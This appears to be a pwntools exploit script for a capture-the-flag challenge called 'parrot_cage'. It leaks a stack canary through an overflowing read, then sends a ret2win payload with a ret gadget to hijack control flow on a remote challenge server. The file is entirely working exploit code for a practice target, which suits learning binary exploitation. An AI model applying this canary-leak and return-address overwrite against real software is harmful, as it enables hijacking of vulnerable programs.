from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13518

elf = ELF('/home/kali/Desktop/offsec/ctf/part1/02_parrot_cage/parrot_cage')
context.binary = elf

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r

canary_offset = 72  #with gdb + cyclic (check rax)
rip_offset = 72 + 8 + 8

win_addr = elf.sym.win
log.info(f"Found 'win' function at: {hex(win_addr)}")


rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"Found 'ret' gadget at: {hex(ret_gadget)}")

r = conn()

r.recvuntil(b"Say 'bye' when you're done chatting.\n")
r.send(b"A"*(canary_offset+1))
r.recvline()                    #\n
leak = r.recvline()[73:80]     #canary bytes
canary_bytes = b"\x00" + leak

canary = u64(canary_bytes)
log.info(f"canary = {canary:#x}")

payload = flat(
    b"bye",
    b"A" * (canary_offset-3),
    p64(canary),
    b"B" * (rip_offset - canary_offset - 8),
    p64(ret_gadget),
    p64(win_addr),
)

#r.interactive()
r.send(payload)
r.interactive()